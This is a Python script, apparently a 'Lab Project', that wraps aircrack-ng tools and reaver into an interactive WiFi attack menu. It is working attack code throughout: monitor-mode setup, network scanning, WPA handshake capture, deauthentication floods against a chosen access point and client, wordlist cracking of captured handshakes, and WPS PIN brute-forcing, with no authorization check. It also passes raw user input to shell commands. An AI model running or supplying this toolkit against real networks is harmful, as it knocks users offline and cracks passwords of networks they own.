#!/usr/bin/env python3
import subprocess
import sys
import os

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

def banner():
    print(f"""{CYAN}
╔═══════════════════════════════════════════════════╗
║                                                   ║
║   ██╗      █████╗ ██████╗     ██████╗  ██████╗   ║
║   ██║     ██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗  ║
║   ██║     ███████║██████╔╝    ██████╔╝██║   ██║  ║
║   ██║     ██╔══██║██╔══██╗    ██╔═══╝ ██║   ██║  ║
║   ███████╗██║  ██║██████╔╝    ██║     ╚██████╔╝  ║
║   ╚══════╝╚═╝  ╚═╝╚═════╝     ╚═╝      ╚═════╝   ║
║                                                   ║
║           WiFi Penetration Toolkit                ║
║                                                   ║
╚═══════════════════════════════════════════════════╝
{RESET}""")

def check_root():
    if os.geteuid() != 0:
        print(f"{RED}[!] Run as root: sudo python3 {sys.argv[0]}{RESET}")
        sys.exit(1)

def check_tools():
    tools = ['iwconfig', 'airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
    missing = []
    for tool in tools:
        try:
            subprocess.run(['which', tool], capture_output=True, check=True)
        except:
            missing.append(tool)
    if missing:
        print(f"{RED}[!] Missing tools: {', '.join(missing)}{RESET}")
        print(f"{YELLOW}[+] Install: sudo apt install aircrack-ng{RESET}")
        return False
    return True

def get_interfaces():
    try:
        result = subprocess.run(['iwconfig'], capture_output=True, text=True, check=True)
        return result.stdout
    except:
        return ""

def start_monitor(interface):
    if not interface:
        return False
   
    # Check if interface already in monitor mode
    try:
        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            print(f"{GREEN}[+] Interface {interface} already in monitor mode{RESET}")
            return interface
    except:
        pass
   
    try:
        subprocess.run(f"airmon-ng check kill", shell=True, check=True)
        subprocess.run(f"airmon-ng start {interface}", shell=True, check=True)
       
        # Check what interface name was created
        monitor_interface = interface
        if not interface.endswith("mon"):
            monitor_interface = f"{interface}mon"
           
        # Verify monitor interface exists
        result = subprocess.run(['iwconfig', monitor_interface], capture_output=True, text=True)
        if result.returncode == 0 and "Mode:Monitor" in result.stdout:
            print(f"{GREEN}[+] Monitor mode started on {monitor_interface}{RESET}")
            return monitor_interface
        else:
            print(f"{YELLOW}[!] Checking for alternative interface name...{RESET}")
            return interface  # Return original if monitor not found
    except:
        print(f"{RED}[!] Failed to start monitor mode{RESET}")
        return interface  # Return original interface

def stop_monitor(interface):
    try:
        # Try to stop monitor mode if interface ends with 'mon'
        if interface.endswith("mon"):
            original_iface = interface[:-3]  # Remove 'mon'
            subprocess.run(f"airmon-ng stop {interface}", shell=True)
            subprocess.run(f"ifconfig {original_iface} down", shell=True)
            subprocess.run(f"ifconfig {original_iface} up", shell=True)
        else:
            subprocess.run(f"ifconfig {interface} down", shell=True)
            subprocess.run(f"ifconfig {interface} up", shell=True)
        print(f"{GREEN}[+] Monitor mode stopped{RESET}")
    except:
        pass

def scan_networks(interface):
    print(f"{BLUE}[+] Starting network scan on {interface}...{RESET}")
    try:
        subprocess.run(f"airodump-ng {interface}", shell=True)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan stopped{RESET}")

def capture_handshake(interface, bssid, channel, output):
    print(f"{GREEN}[+] Capturing handshake on {interface}...{RESET}")
    print(f"{YELLOW}[!] Run deauth in another terminal: aireplay-ng --deauth 0 -a {bssid} {interface}{RESET}")
    try:
        subprocess.run(f"airodump-ng -c {channel} --bssid {bssid} -w {output} {interface}", shell=True)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Capture stopped{RESET}")

def deauth_attack(interface, bssid, client=""):
    print(f"{RED}[+] Starting deauth attack on {interface}...{RESET}")
    cmd = f"aireplay-ng --deauth 10 -a {bssid}"
    if client:
        cmd += f" -c {client}"
    cmd += f" {interface}"
    try:
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Deauth stopped{RESET}")

def crack_password(capture_file, wordlist):
    if not os.path.exists(capture_file):
        print(f"{RED}[!] File not found: {capture_file}{RESET}")
        return
    if not os.path.exists(wordlist):
        print(f"{RED}[!] Wordlist not found: {wordlist}{RESET}")
        return
    print(f"{CYAN}[+] Cracking password...{RESET}")
    try:
        subprocess.run(f"aircrack-ng -w {wordlist} {capture_file}", shell=True)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Crack stopped{RESET}")

def wps_attack(interface, bssid):
    print(f"{MAGENTA}[+] Starting WPS attack on {interface}...{RESET}")
    try:
        subprocess.run(f"reaver -i {interface} -b {bssid} -vv", shell=True)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] WPS attack stopped{RESET}")

def main():
    banner()
    check_root()
   
    if not check_tools():
        sys.exit(1)
   
    print(f"{GREEN}[+] Available interfaces:{RESET}")
    print(get_interfaces())
   
    interface = input(f"\n{CYAN}[?] Enter interface (e.g., wlan0): {RESET}").strip()
    if not interface:
        print(f"{RED}[!] No interface provided{RESET}")
        sys.exit(1)
   
    # Start monitor mode and get correct interface name
    interface = start_monitor(interface)
   
    # Verify interface exists before proceeding
    try:
        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{RED}[!] Interface {interface} not found!{RESET}")
            print(f"{YELLOW}[+] Available interfaces:{RESET}")
            print(get_interfaces())
            sys.exit(1)
    except:
        print(f"{RED}[!] Cannot verify interface {interface}{RESET}")
        sys.exit(1)
   
    print(f"{GREEN}[+] Using interface: {interface}{RESET}")
   
    while True:
        print(f"""
{MAGENTA}
╔══════════════════════════════════════╗
║       WiFi Penetration Toolkit       ║
╠══════════════════════════════════════╣
║  1. Scan Networks                    ║
║  2. Capture Handshake                ║
║  3. Deauth Attack                    ║
║  4. Crack Password                   ║
║  5. WPS Attack                       ║
║  6. Exit                             ║
╚══════════════════════════════════════╝
{RESET}""")
       
        choice = input(f"{BLUE}[?] Select option (1-6): {RESET}").strip()
       
        if choice == "1":
            scan_networks(interface)
        elif choice == "2":
            bssid = input(f"{CYAN}[?] BSSID: {RESET}").strip()
            channel = input(f"{CYAN}[?] Channel: {RESET}").strip()
            output = input(f"{CYAN}[?] Output file: {RESET}").strip() or "capture"
            capture_handshake(interface, bssid, channel, output)
        elif choice == "3":
            bssid = input(f"{RED}[?] BSSID: {RESET}").strip()
            client = input(f"{RED}[?] Client MAC (optional): {RESET}").strip()
            deauth_attack(interface, bssid, client)
        elif choice == "4":
            capture_file = input(f"{GREEN}[?] Capture file (.cap): {RESET}").strip()
            wordlist = input(f"{GREEN}[?] Wordlist: {RESET}").strip() or "/usr/share/wordlists/rockyou.txt"
            crack_password(capture_file, wordlist)
        elif choice == "5":
            bssid = input(f"{MAGENTA}[?] BSSID: {RESET}").strip()
            wps_attack(interface, bssid)
        elif choice == "6":
            stop_monitor(interface)
            print(f"{CYAN}[+] Exiting Lab Project...{RESET}")
            break
        else:
            print(f"{RED}[!] Invalid option{RESET}")
       
        if choice != "6":
            input(f"\n{YELLOW}[?] Press Enter to continue...{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Lab Project interrupted{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        sys.exit(1)
